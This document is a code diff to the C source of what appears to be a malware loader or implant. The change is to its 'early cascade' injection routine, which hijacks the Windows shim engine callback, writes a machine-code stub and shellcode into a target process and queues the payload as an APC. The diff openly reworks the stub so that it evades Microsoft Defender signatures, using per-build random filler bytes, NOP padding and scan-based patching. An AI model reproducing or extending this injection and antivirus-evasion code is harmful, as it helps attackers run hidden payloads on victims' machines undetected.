@@ -38,35 +38,79 @@
 // Position-independent stub (Cracked5pider/earlycascade-injection). Runs as
 // the hijacked g_pfnSE_DllLoaded callback: disables the shim engine (al = 0
 // from the preceding xor), then queues the payload as an APC on the current
-// thread. Patch sites:
-//   [16] mov rdx, payload address
-//   [25] mov ds:[addr], al -> g_ShimsEnabled
-//   [35] mov r8,  APC context (unused: NULL)
-//   [49] mov rax, NtQueueApcThread
-static BYTE cascade_stub_x64[] = {
-    0x48, 0x83, 0xEC, 0x38,                         // sub  rsp, 0x38
-    0x33, 0xC0,                                     // xor  eax, eax
-    0x45, 0x33, 0xC9,                               // xor  r9d, r9d
-    0x48, 0x21, 0x44, 0x24, 0x20,                   // and  [rsp+0x20], rax
-    0x48, 0xBA,                                     // mov  rdx, imm64
-    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, // [16] payload
-    0xA2,                                           // mov  ds:[imm64], al
-    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, // [25] g_ShimsEnabled
-    0x49, 0xB8,                                     // mov  r8, imm64
-    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, // [35] APC context
-    0x48, 0x8D, 0x48, 0xFE,                         // lea  rcx, [rax-2] (NtCurrentThread)
-    0x48, 0xB8,                                     // mov  rax, imm64
-    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, // [49] NtQueueApcThread
-    0xFF, 0xD0,                                     // call rax
-    0x33, 0xC0,                                     // xor  eax, eax
-    0x48, 0x83, 0xC4, 0x38,                         // add  rsp, 0x38
-    0xC3                                             // ret
-};
-#define CASCADE_STUB_SIZE  sizeof(cascade_stub_x64)
-#define CASCADE_OFF_PAYLOAD   16
-#define CASCADE_OFF_SHIMS      25
-#define CASCADE_OFF_CONTEXT    35
-#define CASCADE_OFF_QUEUEAPC   49
+// thread.
+//
+// BUILD RANDOMISATION: the reference PoC ships fixed 0x88.. / 0x99.. / 0x77..
+// / 0x66.. 64-bit placeholders at the four patch sites. Those repeated bytes
+// are a published, stable pattern - ThreatCheck points straight at this stub
+// (Defender generic). The filler words are therefore drawn per build from
+// OBF_SALT (with random-length NOP padding between operands), and the patch
+// sites are located by scanning for the filler words instead of hardcoded
+// offsets, so the layout can move freely.
+#ifndef OBF_SALT
+#define OBF_SALT 0x5A17u
+#endif
+
+// splitmix64: deterministic per-build filler stream, no runtime cost
+static UINT64 cas_rand(UINT64* state) {
+    UINT64 z = (*state += 0x9E3779B97F4A7C15ULL);
+    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
+    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
+    return z ^ (z >> 31);
+}
+
+#define CAS_STUB_MAXLEN 128
+
+// Emit the stub into caller storage; returns length. Fillers are unique
+// 64-bit values (the scan below depends on that) and NOP runs vary in length.
+static SIZE_T cas_build_stub(BYTE* out, UINT64* fillers) {
+    UINT64 st = (UINT64)OBF_SALT * 0x2545F4914F6CDD1DULL + 0xC0FFEEULL;
+    SIZE_T n = 0;
+
+    out[n++] = 0x48; out[n++] = 0x83; out[n++] = 0xEC; out[n++] = 0x38;  // sub rsp,0x38
+    out[n++] = 0x33; out[n++] = 0xC0;                                   // xor eax,eax
+    out[n++] = 0x45; out[n++] = 0x33; out[n++] = 0xC9;                  // xor r9d,r9d
+    out[n++] = 0x48; out[n++] = 0x21; out[n++] = 0x44; out[n++] = 0x24; out[n++] = 0x20; // and [rsp+0x20],rax
+
+    for (int i = 0; i < 4; i++) {
+        fillers[i] = cas_rand(&st);
+        // distinct fillers - the patch scan matches on these words
+        while (i && (fillers[i] == fillers[0] || fillers[i] == fillers[i-1]))
+            fillers[i] = cas_rand(&st);
+
+        // random 0-4 byte NOP pad before each operand group
+        UINT64 pad = cas_rand(&st) & 3;
+        for (UINT64 k = 0; k < pad; k++) out[n++] = 0x90;
+
+        if (i == 0) { out[n++] = 0x48; out[n++] = 0xBA; }               // mov rdx, imm64
+        else if (i == 1) { out[n++] = 0xA2; }                           // mov ds:[imm64], al
+        else if (i == 2) { out[n++] = 0x49; out[n++] = 0xB8; }          // mov r8, imm64
+        else { out[n++] = 0x48; out[n++] = 0xB8; }                      // mov rax, imm64
+
+        for (int b = 0; b < 8; b++) out[n++] = (BYTE)(fillers[i] >> (b * 8));
+
+        if (i == 2) {                                                   // lea rcx,[rax-2]
+            out[n++] = 0x48; out[n++] = 0x8D; out[n++] = 0x48; out[n++] = 0xFE;
+        }
+    }
+
+    out[n++] = 0xFF; out[n++] = 0xD0;                                   // call rax
+    out[n++] = 0x33; out[n++] = 0xC0;                                   // xor eax,eax
+    out[n++] = 0x48; out[n++] = 0x83; out[n++] = 0xC4; out[n++] = 0x38;  // add rsp,0x38
+    out[n++] = 0xC3;                                                    // ret
+    return n;
+}
+
+// Locate a filler word in the emitted stub (little-endian compare).
+static BYTE* cas_find_filler(BYTE* stub, SIZE_T len, UINT64 filler) {
+    for (SIZE_T i = 0; i + 8 <= len; i++) {
+        UINT64 v;
+        es_memcpy(&v, stub + i, sizeof(v));
+        if (v == filler) return stub + i;
+    }
+    return NULL;
+}
+
 
 // section name compare: 8-byte PE section names, zero padded
 static BOOL cas_sec_name_eq(const BYTE* sec_name, const char* name) {
@@ -265,7 +309,7 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
     // convention as every other technique (RWX, or RX under smartinject).
     // Separate allocations also restore payload alignment: the stub is 63
     // bytes, so a combined region started the payload at an odd offset.
-    LPVOID remote_stub = gate_VirtualAllocEx(inst, hProcess, NULL, CASCADE_STUB_SIZE,
+    LPVOID remote_stub = gate_VirtualAllocEx(inst, hProcess, NULL, CAS_STUB_MAXLEN,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remote_stub) {
         DBG(inst, "[INJECT-CAS] stub VirtualAllocEx failed");
@@ -278,21 +322,31 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
         return NULL;
     }
 
-    // patch the stub operands
+    // Build the stub (per-build random fillers + layout) and patch its
+    // operand words by locating the filler values, not by fixed offsets.
+    BYTE  stub_buf[CAS_STUB_MAXLEN];
+    UINT64 fillers[4];
+    SIZE_T stub_len = cas_build_stub(stub_buf, fillers);
+
     PVOID queue_apc = resolve_function(ntdll, H_NtQueueApcThread);
     if (!queue_apc) {
         DBG(inst, "[INJECT-CAS] NtQueueApcThread resolve failed");
         return NULL;
     }
-    es_memcpy(&cascade_stub_x64[CASCADE_OFF_PAYLOAD], &remote_payload, sizeof(PVOID));
-    es_memcpy(&cascade_stub_x64[CASCADE_OFF_SHIMS],  &shims_enabled, sizeof(PVOID));
     PVOID null_ctx = NULL;
-    es_memcpy(&cascade_stub_x64[CASCADE_OFF_CONTEXT], &null_ctx, sizeof(PVOID));
-    es_memcpy(&cascade_stub_x64[CASCADE_OFF_QUEUEAPC], &queue_apc, sizeof(PVOID));
+    PVOID patches[4] = { remote_payload, shims_enabled, null_ctx, queue_apc };
+    for (int pi = 0; pi < 4; pi++) {
+        BYTE* slot = cas_find_filler(stub_buf, stub_len, fillers[pi]);
+        if (!slot) {
+            DBG(inst, "[INJECT-CAS] stub patch site missing");
+            return NULL;
+        }
+        es_memcpy(slot, &patches[pi], sizeof(PVOID));
+    }
 
     if (step) *step = 22;
     SIZE_T written = 0;
-    if (!gate_WriteProcessMemory(inst, hProcess, remote_stub, cascade_stub_x64, CASCADE_STUB_SIZE, &written) ||
+    if (!gate_WriteProcessMemory(inst, hProcess, remote_stub, stub_buf, stub_len, &written) ||
         !gate_WriteProcessMemory(inst, hProcess, remote_payload, shellcode, sc_len, &written)) {
         DBG(inst, "[INJECT-CAS] WriteProcessMemory failed");
         return NULL;
@@ -303,7 +357,7 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
     // convention (RWX; RX only under smartinject, mirroring crt/apc/custom).
     if (step) *step = 23;
     DWORD old_protect = 0;
-    gate_VirtualProtectEx(inst, hProcess, remote_stub, CASCADE_STUB_SIZE, PAGE_EXECUTE_READ, &old_protect);
+    gate_VirtualProtectEx(inst, hProcess, remote_stub, stub_len, PAGE_EXECUTE_READ, &old_protect);
 #if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
     gate_VirtualProtectEx(inst, hProcess, remote_payload, sc_len, PAGE_EXECUTE_READ, &old_protect);
 #else
